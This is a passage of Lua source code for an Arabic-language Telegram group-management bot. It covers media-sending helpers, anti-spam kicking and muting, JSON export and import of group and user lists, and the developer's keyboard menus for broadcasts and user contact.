tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "SOPOWERB0T")
local NameUser = "⋄بواسطه »> ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "⋄اسم المستخدم »> ["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"⋄الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
function Total_Msg(msgs)  
local Black_Msg = ''  
if msgs < 100 then 
Black_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Black_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Black_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Black_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Black_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Black_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Black_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Black_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Black_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Black_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Black_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Black_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Black_Msg = 'رب التفاعل'  
end 
return Black_Msg 
end
--sendText(SUDO," ⋄شكرا لاستخدامك سورس بلاك\n⋄اضغط /sudo لي تشغيل البوت",0,'md')
function Get_Info(msg,chat,user) 
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n⋄مالك الجروب')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n⋄مجرد عضو هنا ')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n⋄الشخص غير موجود هنا ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️'
else
info = '✖'
end
if Json_Info.result.can_delete_messages == true then
delete = '✔️'
else
delete = '✖'
end
if Json_Info.result.can_invite_users == true then
invite = '✔️'
else
invite = '✖'
end
if Json_Info.result.can_pin_messages == true then
pin = '✔️'
else
pin = '✖'
end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️'
else
restrict = '✖'
end
if Json_Info.result.can_promote_members == true then
promote = '✔️'
else
promote = '✖'
end
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ↓ \nٴ┉┉┉┉┉┉┉┉┉┉'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
function GetGroupsBot(msg) ---قائمه المجموعات
os.execute('rm -fr Groups.json')
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'PWOER Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"PWOER":"'..NAME..'",'
else
t = t..',"'..v..'":{"PWOER":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./Groups.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './Groups.json', '- عدد جروبات التي في البوت { '..#list..'}')
os.execute('rm -fr Groups.json')
end
function GetUsersBot(msg)
os.execute('rm -fr users.json')
local list = database:smembers(bot_id..'User_Bot')
local t = '{"users":['  
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end
t = t..']}'
local File = io.open('./users.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}')
os.execute('rm -fr users.json')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.")  
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
os.execute('rm -rf ./'..rre) 
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_," ⋄ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ⋄جاري ...\n⋄رفع الملف الان")
else
send(chat,msg.id_,"* ⋄عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n⋄تم رفع الملف بنجاح وتفعيل الجروبات\n⋄ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n⋄العضــو »> '..Name..'\n⋄قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n⋄العضــو »> '..Name..'\n⋄قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n⋄العضــو »> '..Name..'\n⋄قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  
function plugin_Dev3Yad(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Dev3Yad and msg then
pre_msg = plugin.Dev3Yad(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end

--------------------------------------------------------------------------------------------------------------
function SourceBlack(msg,data) -- بداية العمل
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'USERBOT' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ☉" then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء الاذاعه")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_," ⋄تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'USERBOT' then
if text == '/start' or text == 'رجوع ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄يمكنك التحكم بي البوت\n⋄عن طريق كيبورد المطور الاساسي \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'الاجباري ☉','التواصل ☉','العام ☉'},
{'الرتب العامه ☉','المطورين ☉','الردود ☉'},
{'الاذاعه ☉','الاعدادات ☉','الاحصائيات ☉'},
{'اعاده التشغيل ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
else
if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
local Sudo_Welcome = 'يمكنك استخدام الاوامر الخدميه للبوت عن طريق لوحه التحكم بلاسفل'
local inline = {
{{text = 'الـمـطـور', url="http://t.me/"..SUDOUSER}},
{{text = 'اضف '..Name_Bot..' الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
} 
local Keyboard = {
{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
{'نسبه الكره','نسبه الرجوله'},
{'نسبه الحب','نسبه الانوثه'},
{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
{'ايدي','العاب بلاك','سورس','تغير الايدي'},
{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
{'زخرفه','معاني الاسما','الابراج','حساب العمر'},
}
local start = database:get(bot_id.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⋄مرحبا عزيزي انا بوت اسمي "..Name_Bot.."\n⋄اختصائي حمايه جروبات من الدرجه الاوله\n⋄طريقه تفعيلي في المجموعات\n⋄1-قم بي اضافتي الي مجموعتك\n⋄2-قم بي رفعي مشرف مع كامل الصلاحيات\n⋄و سيتم تفعيل البوت و تثبيت مشرفين المجموعه ادمن في البوت\n⋄يمكنك التواصل مع المطور من الزر ادناه"
end
send_inline_key(msg.chat_id_,Start_Source,nil,inline)
send_inline_key(msg.chat_id_,Sudo_Welcome,Keyboard)
end
database:del(bot_id..'Start:Time'..msg.sender_user_id_)
return false
end end
if text == 'الاجباري ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر الاشتراك الاجباري \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'تفعيل الاشتراك الاجباري ☉','تعطيل الاشتراك الاجباري ☉'},
{'الاشتراك الاجباري ☉'},
{'تغير رساله الاشتراك ☉','مسح رساله الاشتراك ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'التواصل ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر التواصل \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'ضع كليشه تواصل ☉','مسح كليشه التواصل ☉','جلب كليشه التواصل ☉'},
{'تفعيل التواصل ☉','تعطيل التواصل ☉'},
{'كشف ☉','الغاء حظر ☉','حظر ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'العام ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر العام \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'مسح العام ☉'},
{'قائمه الكتم العام ☉','قائمه الحظر العام ☉'},
{'مسح الكتم العام ☉','مسح الحظر العام ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'الرتب العامه ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر الرتب العامه \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'المطورين ☉'},
{'الادمنيه العامين ☉','المدراء العامين ☉'},
{'مسح الادمنيه العامين ☉','مسح المدراء العامين ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'المطورين ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر رتب المطورين \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'الرتب العامه ☉'},
{'المطورين الثانين ☉','المطورين الثالثين ☉'},
{'مسح المطورين الثانين ☉','مسح المطورين الثالثين ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'الردود ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر الردود \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'مسح رد عام ☉','الردود العامه ☉','اضف رد عام ☉'},
{'مسح الردود العامه ☉','مسح الردود المتعدده ☉'},
{'مسح رد متعدد ☉','الردود المتعدده ☉','اضف رد متعدد ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'الاذاعه ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر الاذاعه \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'اذاعه بالتثبيت ☉'},
{'اذاعه ☉','اذاعه خاص ☉'},
{'اذاعه بالتوجيه ☉','اذاعه بالتوجيه خاص ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'الاعدادات ☉' then  
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر الاعدادات \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'ضع كليشه ستارت ☉','مسح كليشه ستارت ☉','جلب كليشه ستارت ☉'},
{'ضع اسم للبوت ☉','ضع رد بوت ☉'},
{'تفعيل البوت الخدمي ☉','تعطيل البوت الخدمي ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if text == 'الاحصائيات ☉' then
if SudoBot2(msg) then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local bl = '⋄اهلا عزيزي '..rtp..'\n⋄اليك اوامر الاحصائيات \n⋄[قناه السورس](t.me/SOPOWERB0T)\n⋄[قناه الملفات](t.me/FIPOWERB0T)'
local keyboard = {
{'الجروبات ☉','المشتركين ☉'},
{'جلب الجروبات ☉','جلب المشتركين ☉'},
{'رفع الجروبات ☉','رفع المشتركين ☉'},
{'رجوع ☉'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end end
if not SudoBot2(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
local twasl = database:get(bot_id.."twasl:Bot")
if twasl then 
twasl_Source = twasl
else
twasl_Source = "⋄تم ارسال رسالتك\n⋄سيتم رد في اقرب وقت"
end
send(msg.sender_user_id_, msg.id_,twasl_Source)
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' ⋄تم ارسال الملصق من ↓\n- '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if SudoBot2(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'كشف' or text == 'كشف ☉' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄اضغط علي اسم العضو للانتقال اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false  
end 
if text == 'حظر' or text == 'حظر ☉' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' or text =='الغاء الحظر ☉' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local Black_Msg = '\n⋄قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,Black_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⋄المستخدم »> '..Name..'\n⋄تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end
end,nil)
end,nil)
end,nil)
end,nil)
end
if text == 'جلب كليشه ستارت ☉' then
if not SudoBot2(msg) then
